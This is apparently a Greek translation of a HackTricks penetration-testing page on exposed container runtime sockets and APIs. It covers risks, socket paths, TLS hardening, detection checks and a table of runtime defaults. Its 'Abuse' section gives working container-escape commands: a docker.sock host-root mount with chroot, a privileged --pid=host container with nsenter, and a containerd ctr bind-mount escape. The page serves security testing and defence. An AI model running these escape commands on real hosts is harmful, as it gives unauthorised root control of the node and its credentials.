# Έκθεση Runtime API και daemon

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλές πραγματικές παραβιάσεις container δεν ξεκινούν καθόλου με escape από namespace. Ξεκινούν με πρόσβαση στο runtime control plane. Εάν ένα workload μπορεί να μιλήσει στο `dockerd`, `containerd`, CRI-O, Podman, ή kubelet μέσω ενός mounted Unix socket ή ενός εκτεθειμένου TCP listener, ο επιτιθέμενος μπορεί να μπορεί να ζητήσει ένα νέο container με καλύτερα privileges, να mount-άρει το filesystem του host, να ενταχθεί σε host namespaces, ή να ανακτήσει ευαίσθητες πληροφορίες του node. Σε αυτές τις περιπτώσεις, το runtime API είναι το πραγματικό όριο ασφαλείας, και η παραβίασή του είναι λειτουργικά πολύ κοντά στην παραβίαση του host.

Αυτός είναι ο λόγος που η έκθεση του runtime socket πρέπει να τεκμηριώνεται ξεχωριστά από τις προστασίες του kernel. Ένα container με κανονικό seccomp, capabilities, και MAC confinement μπορεί να απέχει ακόμα ένα API call από την παραβίαση του host αν το `/var/run/docker.sock` ή το `/run/containerd/containerd.sock` είναι mounted μέσα του. Η απομόνωση που παρέχει ο kernel για το τρέχον container μπορεί να λειτουργεί ακριβώς όπως έχει σχεδιαστεί ενώ το runtime management plane παραμένει πλήρως εκτεθειμένο.

## Μοντέλα πρόσβασης daemon

Το Docker Engine παραδοσιακά εκθέτει το privileged API του μέσω του τοπικού Unix socket στο `unix:///var/run/docker.sock`. Ιστορικά έχει επίσης εκτεθεί απομακρυσμένα μέσω TCP listeners όπως `tcp://0.0.0.0:2375` ή μέσω ενός TLS-protected listener στη θύρα `2376`. Η έκθεση του daemon απομακρυσμένα χωρίς ισχυρό TLS και client authentication στην ουσία μετατρέπει το Docker API σε μια απομακρυσμένη root διεπαφή.

Το `containerd`, CRI-O, Podman, και kubelet εκθέτουν παρόμοιες διεπαφές με υψηλό impact. Τα ονόματα και τα workflows διαφέρουν, αλλά η λογική δεν αλλάζει. Εάν η διεπαφή επιτρέπει στον caller να δημιουργεί workloads, να mount-άρει host paths, να ανακτά credentials, ή να τροποποιεί τρέχοντα containers, τότε η διεπαφή είναι ένα privileged management channel και πρέπει να αντιμετωπίζεται ανάλογα.

Κοινές τοπικές διαδρομές που αξίζει να ελεγχθούν είναι:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Παλαιότερα ή πιο εξειδικευμένα stacks μπορεί επίσης να εκθέτουν endpoints όπως `dockershim.sock`, `frakti.sock` ή `rktlet.sock`. Αυτά είναι λιγότερο συνηθισμένα σε σύγχρονα περιβάλλοντα, αλλά όταν εμφανίζονται θα πρέπει να αντιμετωπίζονται με την ίδια προσοχή επειδή αντιπροσωπεύουν επιφάνειες ελέγχου runtime και όχι απλά ordinary application sockets.

## Ασφαλής Απομακρυσμένη Πρόσβαση

Εάν ένας daemon πρέπει να εκτεθεί πέρα από το τοπικό socket, η σύνδεση πρέπει να προστατεύεται με TLS και προτιμητέα με αμοιβαία αυθεντικοποίηση ώστε ο daemon να επαληθεύει τον πελάτη και ο πελάτης τον daemon. Η παλιά συνήθεια να ανοίγει κανείς τον Docker daemon σε plain HTTP για ευκολία είναι ένα από τα πιο επικίνδυνα λάθη στη διαχείριση containers, επειδή η επιφάνεια του API είναι αρκετά ισχυρή ώστε να δημιουργεί απευθείας privileged containers.

Το ιστορικό μοτίβο ρύθμισης του Docker ήταν το εξής:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Σε συστήματα που βασίζονται σε systemd, η επικοινωνία του daemon μπορεί επίσης να εμφανίζεται ως `fd://`, που σημαίνει ότι η διεργασία κληρονομεί ένα ήδη ανοιγμένο socket από το systemd αντί να το bind-άρει απευθείας η ίδια. Το σημαντικό μάθημα δεν είναι η ακριβής σύνταξη αλλά η συνέπεια για την ασφάλεια. Από τη στιγμή που ο daemon ακούει πέρα από ένα τοπικό socket με σφικτά περιορισμένα δικαιώματα, το transport security και η client authentication γίνονται υποχρεωτικά αντί για προαιρετικό hardening.

## Κατάχρηση

Εάν υπάρχει runtime socket, επιβεβαιώστε ποιο είναι, αν υπάρχει συμβατός client, και αν είναι δυνατή η πρόσβαση μέσω raw HTTP ή gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες επειδή διακρίνουν μεταξύ μιας ανενεργής διαδρομής, ενός mounted αλλά μη προσβάσιμου socket, και ενός ενεργού privileged API. Αν ο client έχει επιτυχία, το επόμενο ερώτημα είναι αν το API μπορεί να εκκινήσει ένα νέο container με host bind mount ή κοινή χρήση host namespace.

### Πλήρες Παράδειγμα: Docker Socket To Host Root

Αν το `docker.sock` είναι προσβάσιμο, το κλασικό escape είναι να ξεκινήσεις ένα νέο container που κάνει mount το root filesystem του host και στη συνέχεια να εκτελέσεις `chroot` μέσα σε αυτό:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Αυτό παρέχει άμεση host-root εκτέλεση μέσω του Docker daemon. Ο αντίκτυπος δεν περιορίζεται στην ανάγνωση αρχείων. Μόλις βρεθεί μέσα στο νέο container, ο attacker μπορεί να τροποποιήσει αρχεία του host, να συλλέξει credentials, να εγκαταστήσει persistence, ή να ξεκινήσει πρόσθετα privileged workloads.

### Full Example: Docker Socket To Host Namespaces

Αν ο attacker προτιμά namespace entry αντί για filesystem-only access:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Αυτή η διαδρομή φτάνει στον host ζητώντας από το runtime να δημιουργήσει ένα νέο container με ρητή έκθεση του host-namespace αντί να εκμεταλλευτεί το τρέχον.

### Πλήρες Παράδειγμα: containerd Socket

Ένα προσαρτημένο `containerd` socket είναι συνήθως εξίσου επικίνδυνο:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ο αντίκτυπος είναι και πάλι ο συμβιβασμός του host. Ακόμη κι αν τα Docker-specific εργαλεία απουσιάζουν, ένα άλλο runtime API μπορεί παρόλα αυτά να προσφέρει την ίδια διαχειριστική ισχύ.

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να απαντήσουν στο κατά πόσο το container μπορεί να προσεγγίσει οποιοδήποτε management plane που θα έπρεπε να παραμείνει έξω από το trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Τι είναι ενδιαφέρον εδώ:

- Ένα προσαρτημένο runtime socket είναι συνήθως μια άμεση πρωτογενής διοικητική δυνατότητα και όχι απλή αποκάλυψη πληροφοριών.
- Ένας TCP listener στο `2375` χωρίς TLS πρέπει να θεωρείται ένδειξη πιθανής απομακρυσμένης παραβίασης.
- Μεταβλητές περιβάλλοντος όπως `DOCKER_HOST` συχνά αποκαλύπτουν ότι το workload σχεδιάστηκε σκόπιμα για να επικοινωνεί με το host runtime.

## Προεπιλογές Runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνηθισμένη χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Τοπικό Unix socket ως προεπιλογή | `dockerd` ακούει στο τοπικό socket και το daemon συνήθως τρέχει με δικαιώματα root | προσαρμογή `/var/run/docker.sock`, έκθεση `tcp://...:2375`, ασθενές ή απουσία TLS στο `2376` |
| Podman | Daemonless CLI ως προεπιλογή | Δεν απαιτείται μακροχρόνιος daemon με προνόμια για τη συνήθη τοπική χρήση· API sockets μπορεί να εκτεθούν όταν το `podman system service` είναι ενεργοποιημένο | έκθεση `podman.sock`, εκτέλεση της υπηρεσίας ευρέως, χρήση API ως root |
| containerd | Τοπικό socket με προνόμια | Διοικητικό API εκτίθεται μέσω του τοπικού socket και συνήθως καταναλώνεται από εργαλεία υψηλότερου επιπέδου | προσαρμογή `containerd.sock`, ευρεία πρόσβαση `ctr` ή `nerdctl`, έκθεση namespaces με προνόμια |
| CRI-O | Τοπικό socket με προνόμια | Το CRI endpoint προορίζεται για τοπικά αξιόπιστα components του κόμβου | προσαρμογή `crio.sock`, έκθεση του CRI endpoint σε μη αξιόπιστα workloads |
| Kubernetes kubelet | Τοπικό API διαχείρισης κόμβου | Ο kubelet δεν πρέπει να είναι ευρέως προσβάσιμος από Pods· η πρόσβαση μπορεί να αποκαλύψει κατάσταση pod, credentials και δυνατότητες εκτέλεσης ανάλογα με authn/authz | προσαρμογή kubelet sockets ή certs, αδύναμη kubelet auth, host networking μαζί με προσβάσιμο kubelet endpoint |
